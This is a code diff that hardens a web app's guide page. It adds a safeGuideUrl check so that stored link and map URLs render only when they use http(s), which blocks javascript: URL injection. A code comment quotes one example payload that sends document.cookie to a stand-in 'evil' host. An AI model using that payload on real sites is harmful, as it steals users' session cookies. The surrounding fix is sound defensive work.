@@ -680,6 +680,17 @@ function escapeHtml(s) {
   return String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 }
 
+// escapeHtml above only escapes HTML-special characters -- it does nothing
+// to the URL *scheme*, so a stored href/src value of e.g.
+// "javascript:fetch('//evil/steal?c='+document.cookie)" would render as a
+// normal-looking, clickable link that executes on click. Guide content
+// (links, and the admin-entered "test yourself" map URL) is admin-written
+// so the bar here is high, but it's cheap insurance to only ever emit
+// http(s) links.
+function safeGuideUrl(url) {
+  return /^https?:\/\//i.test(String(url || '').trim()) ? url : '#';
+}
+
 // Guide photos and map badges are all served straight from Supabase
 // Storage, which rate-limits (429s) a burst of near-simultaneous
 // requests -- a guide with several images loading at once can trip
@@ -1457,9 +1468,9 @@ function renderGuide(c, data) {
                 <span style="color:#00c9a7;flex-shrink:0;font-size:18px;">•</span>
                 <span>
                   ${item.url
-                    ? `<a href="${escapeHtml(item.url)}" target="_blank" rel="noopener" style="color:#e0e0f0;font-weight:700;text-decoration:none;" onmouseover="this.style.color='#00c9a7'" onmouseout="this.style.color='#e0e0f0'">${escapeHtml(item.label)}</a>`
+                    ? `<a href="${escapeHtml(safeGuideUrl(item.url))}" target="_blank" rel="noopener" style="color:#e0e0f0;font-weight:700;text-decoration:none;" onmouseover="this.style.color='#00c9a7'" onmouseout="this.style.color='#e0e0f0'">${escapeHtml(item.label)}</a>`
                     : `<strong style="color:#e0e0f0;">${escapeHtml(item.label)}</strong>`}
-                  ${item.url ? ` <a href="${escapeHtml(item.url)}" target="_blank" rel="noopener" style="color:#7c3aed;font-size:12px;text-decoration:underline;">link ↗</a>` : ''}
+                  ${item.url ? ` <a href="${escapeHtml(safeGuideUrl(item.url))}" target="_blank" rel="noopener" style="color:#7c3aed;font-size:12px;text-decoration:underline;">link ↗</a>` : ''}
                   ${item.desc ? ` <span style="color:#8888aa;">— ${escapeHtml(item.desc)}</span>` : ''}
                 </span>
               </li>`).join('')}
@@ -1490,7 +1501,7 @@ function renderGuide(c, data) {
     document.getElementById('cv-body').innerHTML = `
       <div style="max-width:100%;">${html}</div>
       <div style="text-align:center;margin-top:48px;">
-        ${data.test_map_url ? `<a href="${escapeHtml(data.test_map_url)}" target="_blank" rel="noopener" style="display:inline-block;background:rgba(0,201,167,0.15);border:1px solid #00c9a7;color:#00c9a7;font-weight:700;padding:12px 24px;border-radius:10px;text-decoration:none;font-size:14px;margin-bottom:14px;">🗺️ Test Yourself on the Map</a><br>` : ''}
+        ${data.test_map_url ? `<a href="${escapeHtml(safeGuideUrl(data.test_map_url))}" target="_blank" rel="noopener" style="display:inline-block;background:rgba(0,201,167,0.15);border:1px solid #00c9a7;color:#00c9a7;font-weight:700;padding:12px 24px;border-radius:10px;text-decoration:none;font-size:14px;margin-bottom:14px;">🗺️ Test Yourself on the Map</a><br>` : ''}
         <button onclick="showMap()" style="background:var(--card);border:1px solid var(--border);color:var(--muted);padding:12px 24px;border-radius:10px;cursor:pointer;font-size:14px;transition:all .2s;" onmouseover="this.style.borderColor='var(--teal)';this.style.color='var(--teal)'" onmouseout="this.style.borderColor='var(--border)';this.style.color='var(--muted)'">← Back to World Map</button>
       </div>`;
     return;
